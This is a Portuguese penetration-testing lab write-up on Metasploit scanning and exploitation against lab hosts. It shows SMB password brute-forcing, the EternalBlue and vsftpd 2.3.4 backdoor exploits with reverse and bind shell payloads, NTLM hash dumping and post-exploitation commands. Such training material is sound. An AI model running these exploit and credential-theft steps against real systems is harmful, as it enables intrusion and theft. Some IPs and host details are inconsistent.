<!-- ===================================== -->
<!--   METASPLOIT II - VARREDURA E EXPLORAÇÃO -->
<!-- ===================================== -->
<p align="center">
  <img src="https://img.shields.io/badge/Category-Offensive%20Security-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Focus-Exploitation%20Framework-blue?style=for-the-badge">
</p>
<p align="center">
  <img src="https://img.shields.io/badge/Platform-Multi--Plataforma-black?style=flat-square">
  <img src="https://img.shields.io/badge/Discipline-Penetration%20Testing-purple?style=flat-square">
  <img src="https://img.shields.io/badge/Level-Intermediate-yellow?style=flat-square">
  <img src="https://img.shields.io/badge/Status-Lab%20Documentation-green?style=flat-square">
</p>

---

# 📚 Metasploit II
## Varredura e Exploração
> Do reconhecimento ativo à exploração: uso dos módulos de varredura do Metasploit, integração com banco de dados e o fluxo completo de identificação de vulnerabilidades até a execução do exploit.

---
# Metasploit II - Varredura e Exploração
## Introdução

### O Cenário: Rede da Stratford Systems

Você tem **duas máquinas de laboratório** na rede da Stratford Systems e nenhuma informação além de seus endereços IP. Antes de explorar qualquer vulnerabilidade, você precisa saber:

- 🔍 **Quais portas** estão abertas
- 🖥️ **Quais serviços** estão em execução
- 📦 **Quais versões** desses serviços estão sendo utilizadas

**Por que usar scanners no Metasploit?**

| Aspecto                           | Benefício                                      |
| --------------------------------- | ---------------------------------------------- |
| **Integração com banco de dados** | Resultados armazenados automaticamente         |
| **Disponibilidade imediata**      | Dados prontos para outros módulos              |
| **Execução do Nmap**              | Pode ser executado diretamente do `msfconsole` |

### Fluxo de Trabalho do Reconhecimento

```text
1. Varredura de Portas
   ↓
2. Enumeração de Serviços
   ↓
3. Identificação de Versões
   ↓
4. Análise de Vulnerabilidades
   ↓
5. Exploração
```

---
## Escaneando com o Metasploit

### Varredura de Portas com Módulos Metasploit

O Metasploit inclui vários módulos de varredura de portas em `auxiliary/scanner/portscan/`:

```text
msf6 > search portscan
Matching Modules
================
   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator
```

#### Scanner TCP (Mais Comum)

```text
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options
Module options (auxiliary/scanner/portscan/tcp):
 Name         Current Setting  Required  Description
 ----         ---------------  --------  -----------
 CONCURRENCY  10               yes       The number of concurrent ports to check per host
 DELAY        0                yes       The delay between connections, per thread, in milliseconds
 JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
 PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
 RHOSTS                        yes       The target host(s), [...]
 THREADS      1                yes       The number of concurrent threads (max one per host)
 TIMEOUT      1000             yes       The socket connect timeout in milliseconds
```

**Opções Importantes:**

| Opção         | Padrão    | Descrição           | Recomendação                           |
| ------------- | --------- | ------------------- | -------------------------------------- |
| `PORTS`       | `1-10000` | Intervalo de portas | `1-1024,3389,8000-8100`                |
| `THREADS`     | `1`       | Threads simultâneas | `10` (laboratório), `20-50` (produção) |
| `CONCURRENCY` | `10`      | Portas por host     | Manter `10`                            |
| `TIMEOUT`     | `1000`    | Timeout em ms       | `500` (rede rápida)                    |

#### Executando a Varredura

```text
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.67.160.172
RHOSTS => 10.67.160.172
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1024,3389,8000-8100
PORTS => 1-1024,3389,8000-8100
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 10
THREADS => 10
msf6 auxiliary(scanner/portscan/tcp) > run
[+] 10.67.160.172          - 10.67.160.172:135 - TCP OPEN
[+] 10.67.160.172          - 10.67.160.172:139 - TCP OPEN
[+] 10.67.160.172          - 10.67.160.172:445 - TCP OPEN
[+] 10.67.160.172          - 10.67.160.172:3389 - TCP OPEN
[+] 10.67.160.172          - 10.67.160.172:8000 - TCP OPEN
[*] 10.67.160.172          - Scanned 1 of 1 hosts (100% complete)
```

**Resultados:** 5 portas abertas identificadas.

### Executando o Nmap a partir do Msfconsole

```text
msf6 > nmap -sV -O 10.67.160.172
[*] exec: nmap -sV -O 10.67.160.172
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-14 06:59 BST
Nmap scan report for 10.67.160.172
Host is up (0.0015s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  tcpwrapped
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8000/tcp open  http-alt      webfs/1.21
Service Info: Host: STRATFORD-WS01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Informações Obtidas:**

- ✅ Porta 445: SMB em Windows    
- ✅ Hostname: `STRATFORD-WS01`
- ✅ Porta 8000: `webfs/1.21`

> **Nota:** `nmap` exibe resultados mas **não** armazena no banco de dados. Para armazenamento, use `db_nmap`.

### Scanners Específicos por Serviço

#### 1. Scanner NetBIOS (nbname)

```text
msf6 > use auxiliary/scanner/netbios/nbname
msf6 auxiliary(scanner/netbios/nbname) > set RHOSTS 10.67.160.172
RHOSTS => 10.67.160.172
msf6 auxiliary(scanner/netbios/nbname) > run
[+] 10.80.137.252 [STRATFORD-WS01] OS:Windows Names:(STRATFORD-WS01)
```

**Obtido:** Nome NetBIOS `STRATFORD-WS01`.

#### 2. Scanner de Versão HTTP

```text
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > set RHOSTS 10.67.160.172
RHOSTS => 10.67.160.172
msf6 auxiliary(scanner/http/http_version) > set RPORT 8000
RPORT => 8000
msf6 auxiliary(scanner/http/http_version) > run
[+] 10.67.160.172:8000 webfs/1.21
```

**Obtido:** Servidor `webfs/1.21` na porta 8000.

#### 3. Força Bruta em Login SMB

```text
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.67.160.172
RHOSTS => 10.67.160.172
msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER penny
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
PASS_FILE => /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
msf6 auxiliary(scanner/smb/smb_login) > set VERBOSE false
msf6 auxiliary(scanner/smb/smb_login) > run
[+] 10.67.160.172:445 - Success: '.\penny:leo1234'
```

**Credencial encontrada:** `penny:leo1234`.

### Como Escolher o Scanner Certo

|Passo|Ação|Exemplo|
|---|---|---|
|1|Identificar porta/serviço|Porta 21 - FTP|
|2|Buscar módulos relevantes|`search type:auxiliary ftp`|
|3|Usar `info` para entender|`info auxiliary/scanner/ftp/anonymous`|
|4|Configurar e executar|`set RHOSTS` + `run`|

---
## O Banco de Dados Metasploit

### Por que Usar o Banco de Dados?

> **Cenário:** Um ataque real com 50 hosts, cada um com múltiplos serviços abertos.

|Sem Banco de Dados|Com Banco de Dados|
|---|---|
|❌ Anotações manuais|✅ Armazenamento automático|
|❌ Erros de transcrição|✅ Consultas estruturadas|
|❌ Perda de contexto|✅ Relacionamento entre dados|
|❌ Dificuldade em relatórios|✅ Exportação fácil|

### Configurando o Banco de Dados

#### No Kali Linux:

```bash
# Inicializar banco de dados
sudo msfdb init
# Iniciar serviço PostgreSQL (se necessário)
sudo systemctl start postgresql
# Iniciar msfconsole
msfconsole
```

#### Verificando Conexão:

```text
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

> **Importante:** No Kali, use `sudo msfdb init` (não `sudo -u postgres msfdb init`).

### Espaços de Trabalho (Workspaces)

Isolam dados de diferentes projetos:

```text
# Ver workspace atual
msf6 > workspace
* default

# Criar workspace
msf6 > workspace -a stratford
[*] Added workspace: stratford

# Listar workspaces
msf6 > workspace
default
* stratford

# Alternar workspace
msf6 > workspace default
[*] Workspace: default

# Excluir workspace
msf6 > workspace -d <name>
```

### Escaneando com db_nmap

O `db_nmap` executa o Nmap e **armazena automaticamente** os resultados:

```text
msf6 > db_nmap -sV -O 10.67.160.172
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-14 07:30 BST
[*] Nmap: Nmap scan report for 10.67.160.172
[*] Nmap: Host is up (0.0012s latency).
[*] Nmap: Not shown: 995 closed ports
[*] Nmap: PORT     STATE SERVICE      VERSION
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  tcpwrapped
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: 8000/tcp open  http-alt      webfs/1.21
```

**Dados armazenados:** hosts, portas, serviços, versões, OS.

### Consultando o Banco de Dados

#### 1. `hosts` - Listar Hosts

```text
msf6 > hosts
Hosts
=====
address        mac  name  os_name           os_flavor  os_sp  purpose  info  comments
-------        ---  ----  -------           ---------  -----  -------  ----  --------
10.67.160.172              Windows Longhorn                    device
```

#### 2. `services` - Listar Serviços

```text
msf6 > services
Services
========
host            port   proto  name          state  info
----            ----   -----  ----          -----  ----
10.67.160.172   135    tcp    msrpc          open   Microsoft Windows RPC
10.67.160.172   139    tcp    tcpwrapped     open
10.67.160.172   445    tcp    microsoft-ds   open
10.67.160.172   3389   tcp    ms-wbt-server  open   Microsoft Terminal Services
10.67.160.172   8000   tcp    http-alt       open   webfs/1.21
```

**Filtros Úteis:**

```text
# Filtrar por serviço
msf6 > services -S webfs

# Filtrar por porta
msf6 > services -p 445
```

#### 3. `creds` - Listar Credenciais

```text
msf6 > creds
Credentials
===========
host            origin          service          public  private   realm  private_type
----            ------          -------          ------  -------   -----  ------------
10.67.160.172   10.67.160.172   445/tcp (smb)    penny   leo1234          Password
```

### Usando Hosts do Banco como RHOSTS

```text
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > hosts -R
Hosts
=====
address      mac  name  os_name       os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------       ---------  -----  -------  ----  --------
10.67.160.172             Windows 2012                    server
msf6 auxiliary(scanner/smb/smb_login) > show options
Module options (scanner/smb/smb_login):
 Name         Current Setting              Required  Description
 ----         ---------------              --------  -----------
 RHOSTS       10.67.160.172                yes       The target host(s)
```

**Variações:**

```text
# Todos os hosts
hosts -R

# Apenas hosts com serviço específico
services -S smb -R

# Apenas hosts com porta específica
services -p 445 -R
```

### Importando Resultados Externos

```text
# Importar XML do Nmap
msf6 > db_import /path/to/nmap_scan.xml

# Exportar dados
msf6 > db_export -f xml /path/to/export.xml
```

**Formatos suportados:** Nmap XML, Nessus, Qualys, Burp Suite, Nikto, etc.

---
## Análise de Vulnerabilidades

### O Conceito de "Fruta Fácil"

> **"Fruta fácil"** = vulnerabilidades fáceis de identificar e explorar.

**Exemplos:**

- Serviços sem patches    
- Credenciais padrão
- Configurações incorretas
- Backdoors conhecidos

### A Abordagem: Versões de Serviço Guiam a Seleção

```text
db_nmap → services → versões → search módulos → scanner
```

**Caso 1: Windows Server 2008 + SMB**

```text
Microsoft Windows Server 2008 → search MS17-010 → smb_ms17_010
```

**Caso 2: vsftpd 2.3.4**

```text
vsftpd 2.3.4 → search vsftpd → vsftpd_234_backdoor
```

**Caso 3: OpenSSH 8.2p1**

```text
OpenSSH 8.2p1 → search openssh → scanner/ssh/ssh_version
```

### Exemplo 1: Verificando MS17-010 (EternalBlue)

```text
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.67.160.172
RHOSTS => 10.67.160.172
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
[+] 10.67.160.172:445 - Host is likely VULNERABLE to MS17-010!
[*] 10.67.160.172:445 - Scanned 1 of 1 hosts (100% complete)
```

**Verificar no Banco de Dados:**

```text
msf6 > vulns
Vulnerabilities
===============
Timestamp                Host            Name                                    References
---------                ----            ----                                    ----------
2026-03-18 15:22:10 UTC  10.67.160.172   MS17-010 SMB RCE Detection              CVE-2017-0143,CVE-2017-0144,CVE-2017-0145
```

### Exemplo 2: Verificando Acesso FTP Anônimo

```text
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > services -S ftp -R
RHOSTS => 10.67.160.172
msf6 auxiliary(scanner/ftp/anonymous) > run
[*] 10.67.160.172:21 - Banner: 220 (vsFTPd 2.3.4)
[-] 10.67.160.172:21 - Login failed: anonymous:mozilla@example.com
```

**Resultado:** Login anônimo **não** permitido (boa prática).

**Mas atenção:** `vsFTPd 2.3.4` é vulnerável a backdoor!

### Padrão de Varredura de Vulnerabilidades

|Passo|Ação|Comando|
|---|---|---|
|1|Analisar versões|`services` / `services -S`|
|2|Buscar scanners|`search type:auxiliary <service>`|
|3|Carregar módulo|`use <module>`|
|4|Definir alvo|`set RHOSTS <ip>` ou `hosts -R`|
|5|Executar|`run`|
|6|Verificar registros|`vulns`|

### Resumo das Vulnerabilidades Encontradas

|Host|Serviço|Versão|Vulnerabilidade|
|---|---|---|---|
|STRATFORD-WS01|SMB|Windows Server 2008|MS17-010 (EternalBlue)|
|stratford-srv01|FTP|vsftpd 2.3.4|Backdoor (porta 6200)|

---
## Exploit 1: EternalBlue (MS17-010)

### Sobre o EternalBlue

| Aspecto             | Detalhe                    |
| ------------------- | -------------------------- |
| **CVE**             | CVE-2017-0144              |
| **Vulnerabilidade** | Estouro de buffer no SMBv1 |
| **Impacto**         | RCE com privilégios SYSTEM |
| **Rank**            | Average (Média)            |
| **Check**           | Suportado ✅                |

### Passo 1: Pesquisar e Selecionar

```text
msf6 > search eternalblue type:exploit
Matching Modules
================
 #   Name                                           Disclosure Date  Rank     Check  Description
 -   ----                                           ---------------  ----     -----  -----------
 0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
 1     \_ target: Automatic Target                  .                .        .      .
 2     \_ target: Windows 7                         .                .        .      .
 3     \_ target: Windows Embedded Standard 7       .                .        .      .
 4     \_ target: Windows Server 2008 R2            .                .        .      .
 5     \_ target: Windows 8                         .                .        .      .
 6     \_ target: Windows 8.1                       .                .        .      .
 7     \_ target: Windows Server 2012               .                .        .      .
 8     \_ target: Windows 10 Pro                    .                .        .      .
 9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

**Payload padrão:** `windows/x64/meterpreter/reverse_tcp` (Meterpreter staged)

### Passo 2: Configurar

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.67.160.172
RHOSTS => 10.67.160.172
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
Module options (exploit/windows/smb/ms17_010_eternalblue):
 Name           Current Setting  Required  Description
 ----           ---------------  --------  -----------
 RHOSTS         10.67.160.172    yes       The target host(s)
 RPORT          445              yes       The target port (TCP)
 SMBDomain                       no        The Windows domain
 SMBPass                         no        The password
 SMBUser                         no        The username
 VERIFY_ARCH    true             yes       Check remote architecture
 VERIFY_TARGET  true             yes       Check remote OS
Payload options (windows/x64/meterpreter/reverse_tcp):
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  thread           yes       Exit technique
 LHOST     ATTACKER_IP      yes       The listen address
 LPORT     4444             yes       The listen port
```

**Verificar LHOST:**

```text
msf6 exploit(...) > set LHOST 10.67.113.113
LHOST => 10.67.113.113
```

### Passo 3: Explorar

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 10.67.113.113:4444
[*] 10.67.160.172:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.67.160.172:445 - Host is likely VULNERABLE to MS17-010!
[*] 10.67.160.172:445 - Connecting to target for exploitation.
[+] 10.67.160.172:445 - Connection established for exploitation.
[+] 10.67.160.172:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.67.160.172:445 - Trying exploit with 12 Groom Allocations.
[*] 10.67.160.172:445 - Sending all but last fragment of exploit packet
[*] Sending stage (201283 bytes) to 10.67.160.172
[*] Meterpreter session 1 opened (10.67.113.113:4444 -> 10.67.160.172:49186)
meterpreter >
```

### Passo 4: Interagir com a Sessão

```text
# Verificar privilégios
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# Buscar arquivo flag
meterpreter > search -f flag.txt
Found 1 result...
 c:\flag.txt (24 bytes)

# Ler flag
meterpreter > cat c:\\Users\\Administrator\\Desktop\\flag.txt
THM-REDACTED

# Extrair hashes de senhas
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:REDACTED:::
```

**Resultado:**

- ✅ Acesso como `NT AUTHORITY\SYSTEM`    
- ✅ Flag encontrada
- ✅ Hashes NTLM extraídos

### Passo 5: Contextualizar para Próximo Exploit

```text
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

---
## Exploit 2: Backdoor vsftpd 2.3.4

### Sobre o vsftpd 2.3.4 Backdoor

| Aspecto        | Detalhe                            |
| -------------- | ---------------------------------- |
| **Descoberta** | 2011                               |
| **Natureza**   | Código malicioso inserido no fonte |
| **Trigger**    | Username terminado com `:)`        |
| **Backdoor**   | Abre shell na porta 6200           |
| **Rank**       | Excellent (Excelente)              |
| **Check**      | Não suportado ❌                    |

**Como funciona:**

1. Conecta-se ao FTP (porta 21)    
2. Envia username terminado com `:)` (ex: `user:)`)
3. Backdoor abre shell na porta 6200
4. Conecta-se à porta 6200 para shell root

### Passo 1: Pesquisar e Selecionar

```text
msf6 > search vsftpd
Matching Modules
================
   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
msf6 > use 1
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

**Diferenças do EternalBlue:**

| Aspecto        | EternalBlue | vsftpd 2.3.4     |
| -------------- | ----------- | ---------------- |
| Rank           | Average     | Excellent        |
| Check          | Yes         | No               |
| Payload padrão | Meterpreter | Shell interativo |
| Tipo de sessão | Meterpreter | Shell de comando |

### Passo 2: Configurar

```text
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.67.154.143
RHOSTS => 10.67.154.143
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/bind_netcat
PAYLOAD => cmd/unix/bind_netcat
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
Module options (exploit/unix/ftp/vsftpd_234_backdoor):
 Name     Current Setting  Required  Description
 ----     ---------------  --------  -----------
 RHOSTS   10.67.154.143    yes       The target host(s)
 RPORT    21               yes       The target port (TCP)
Payload options (cmd/unix/bind_netcat):
 Name   Current Setting  Required  Description
 ----   ---------------  --------  -----------
 LPORT  6200             yes       The listen port
 RHOST  10.67.154.143    no        The target address
```

### Passo 3: Explorar

```text
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 10.67.154.143:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.67.154.143:21 - USER: 331 Please specify the password.
[+] 10.67.154.143:21 - Backdoor service has been spawned, handling...
[+] 10.67.154.143:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 2 opened (ATTACKER_IP:42069 -> 10.67.154.143:6200)
id
uid=0(root) gid=0(root)
whoami
root
hostname
stratford-srv01
pwd
/root
```

**Observações:**

- ✅ Acesso como `root`    
- ✅ Shell interativo direto (não Meterpreter)
- ✅ Nenhum prompt `meterpreter >` (prompt vazio)

### Passo 4: Interagir com a Sessão

```text
# Listar diretório
ls -la
total 88
drwx------  5 root root  4096 Mar 18 15:52 .
drwxr-xr-x 23 root root  4096 Mar 18 15:45 ..
-rw-------  1 root root   731 Mar 18 15:52 .bash_history
drwxr-xr-x  3 root root  4096 Mar 18 15:45 .local
-rw-r--r--  1 root root    24 Mar 18 15:45 flag.txt

# Ler flag
cat flag.txt
THM-REDACTED
```

### Comparação entre Exploits

| Dimensão                    | EternalBlue                           | vsftpd 2.3.4        |
| --------------------------- | ------------------------------------- | ------------------- |
| **Serviço alvo**            | SMB (porta 445)                       | FTP (porta 21)      |
| **SO alvo**                 | Windows 7/Server 2008                 | Ubuntu/Linux        |
| **Tipo de vulnerabilidade** | Estouro de buffer                     | Backdoor no código  |
| **Rank**                    | Average                               | Excellent           |
| **Check suportado**         | ✅ Sim                                 | ❌ Não               |
| **Payload padrão**          | `windows/x64/meterpreter/reverse_tcp` | `cmd/unix/interact` |
| **Tipo de sessão**          | Meterpreter                           | Shell de comando    |
| **Privilégio obtido**       | NT AUTHORITY\SYSTEM                   | root                |

### Fluxo de Trabalho Comum

```text
1. Search → 2. Use → 3. Set options → 4. Exploit → 5. Interact
```

**Independente de:**

- Protocolo (SMB vs FTP)    
- Sistema operacional (Windows vs Linux)
- Tipo de vulnerabilidade (buffer overflow vs backdoor)
- Tipo de sessão (Meterpreter vs shell)

---
## Checklist do Pentester

### Fase 1: Configuração (2-3 minutos)

- **Iniciar msfconsole**

```bash
msfconsole
```

- **Verificar banco de dados**

```text
db_status

# Se não conectado:
msfdb init
sudo systemctl start postgresql
```


- **Criar workspace (se necessário)**

```text
workspace -a <projeto>
workspace <projeto>
```

### Fase 2: Varredura (5-15 minutos)

- **Varredura de portas**

```text
use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
set PORTS 1-1024,3389,8000-8100
set THREADS 10
run
```

- **Varredura de versões com db_nmap**

```text
db_nmap -sV -O <target>
```

- **Scanners específicos por serviço**

```text
# NetBIOS
use auxiliary/scanner/netbios/nbname

# HTTP
use auxiliary/scanner/http/http_version

# SMB
use auxiliary/scanner/smb/smb_version
```

### Fase 3: Análise de Vulnerabilidades (5-10 minutos)

- **Listar serviços descobertos**

```text
services
services -S <service>
```

- **Buscar scanners de vulnerabilidade**

```text
search type:auxiliary <service_or_cve>
```

- **Executar scanners de vulnerabilidade**

```text
use <module>
set RHOSTS <target>  # ou hosts -R
run
```

- **Verificar vulnerabilidades registradas**

```text
vulns
```

### Fase 4: Exploração (10-20 minutos)

- **Selecionar exploit**

```text
search <cve_or_service>
use <index_or_path>
```

- **Configurar parâmetros**

```text
set RHOSTS <target>
set PAYLOAD <payload>
set LHOST <your_ip>
set LPORT <port>
```

- **Verificar (se suportado)**

```text
check
```

- **Executar**

```text
exploit

# ou com segundo plano automático
exploit -z
```

### Fase 5: Pós-Exploração

- **Verificar privilégios**

```text
# Meterpreter
getuid

# Shell
whoami
id
```

- **Coletar informações**

```text
# Meterpreter
sysinfo
hashdump
getenv

# Shell
hostname
ip addr
cat /etc/passwd
```
- **Encontrar flags**

```text
# Meterpreter
search -f flag.txt

# Shell
find / -name flag.txt 2>/dev/null
```

- **Contextualizar sessão**

```text
background
```

### Comandos de Emergência

| Situação                     | Comando/Solução                    |
| ---------------------------- | ---------------------------------- |
| db_nmap não funciona         | `db_status` para verificar conexão |
| LHOST incorreto              | Verificar IP com `ip addr`         |
| Exploit travado              | `CTRL+C` para interromper          |
| Sessão não responde          | `CTRL+Z` para background           |
| Erro de payload incompatível | `show payloads` para ver opções    |
| Credenciais não aparecem     | `creds` para listar                |

---
## Referências

### Documentação Oficial

**Metasploit:**

- [Metasploit Framework Documentation](https://www.metasploit.com/)
- [Metasploit Unleased](https://www.offensive-security.com/metasploit-unleashed/)
- [Metasploit GitHub Repository](https://github.com/rapid7/metasploit-framework)
- [Metasploit Database Guide](https://docs.metasploit.com/docs/using-metasploit/advanced/working-with-data.html)

**Nmap:**
- [Nmap Official Documentation](https://nmap.org/docs.html)
- [Nmap Scripting Engine](https://nmap.org/book/nse.html)

### CVEs e Vulnerabilidades

- [CVE-2017-0144 - EternalBlue](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [MS17-010 Security Update](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010)
- [vsftpd 2.3.4 Backdoor](https://www.exploit-db.com/exploits/17491)
- [CVE-2011-2523 - vsftpd Backdoor](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)

### Módulos Metasploit Utilizados

|Módulo|Categoria|Descrição|
|---|---|---|
|`auxiliary/scanner/portscan/tcp`|Scanner|Varredura TCP de portas|
|`auxiliary/scanner/netbios/nbname`|Scanner|Enumeração NetBIOS|
|`auxiliary/scanner/http/http_version`|Scanner|Identificação de versão HTTP|
|`auxiliary/scanner/smb/smb_login`|Scanner|Força bruta SMB|
|`auxiliary/scanner/smb/smb_ms17_010`|Scanner|Detecção MS17-010|
|`exploit/windows/smb/ms17_010_eternalblue`|Exploit|EternalBlue|
|`exploit/unix/ftp/vsftpd_234_backdoor`|Exploit|vsftpd 2.3.4 backdoor|

### Ferramentas Relacionadas

- [Nmap](https://nmap.org/) - Scanner de rede
- [PostgreSQL](https://www.postgresql.org/) - Banco de dados
- [Exploit-DB](https://www.exploit-db.com/) - Base de exploits
- [SecLists](https://github.com/danielmiessler/SecLists) - Wordlists

### Leitura Adicional

**Livros:**

- "Metasploit: The Penetration Tester's Guide" - David Kennedy et al.
- "The Web Application Hacker's Handbook" - Stuttard & Pinto
- "Penetration Testing: A Hands-On Introduction to Hacking" - Georgia Weidman

**Cursos:**

- Offensive Security - Metasploit Unleashed
- TryHackMe - Metasploit Rooms
- PortSwigger Web Security Academy
